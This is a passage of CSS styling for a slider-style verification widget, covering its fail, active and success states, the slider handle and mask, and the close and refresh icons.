    background-color: #f57a7a !important;
}
.sliderContainer_fail .sliderMask {
    border: 1px solid #f57a7a;
    background-color: #fce1e1;
    border-width: 1px 0 1px 1px;
}
.sliderContainer_fail .sliderIcon:before {
    /*content: "\f00d";*/
    content: "\2716";
}
.sliderContainer_active .sliderText,
.sliderContainer_success .sliderText,
.sliderContainer_fail .sliderText {
    display: none;
}
.sliderMask {
    position: absolute;
    left: 0;
    top: 0;
    height: 40px;
    border: 0 solid #1991FA;
    background: #D1E9FE;
    border-radius: 2px;
}
.slider {
    position: absolute;
    top: 0;
    left: 0;
    width: 40px;
    height: 41px;
    background: #fff;
    box-shadow: 0 0 3px rgba(0, 0, 0, 0.3);
    cursor: pointer;
    transition: background .2s linear;
    border-radius: 2px;
    display: flex;
    align-items: center;
    justify-content: center;
}
.slider:hover {
    background: #1991FA;
}
.slider:hover .sliderIcon {
    background-position: 0 -13px;
}
.sliderText {
    position: relative;
}
.sliderIcon {}
.closeIcon {
    position: absolute;
    right: 0;
    top: -50px;
    cursor: pointer;
    margin: 6px;
    color: rgba(0, 0, 0, .25);
    z-index: 5;
    transition: color .3s linear;
}
.refreshIcon:hover {
    color: #6c757d;
}
.refreshIcon {
    position: absolute;
    right: 5px;
    top: 0px;
    cursor: pointer;
    margin: 10px;
    color: #dddddd;
    z-index: 5;
    transition: color .3s linear;
    font-size: x-large;
}
.closeIcon:hover {
    color: #6c757d;
}</style>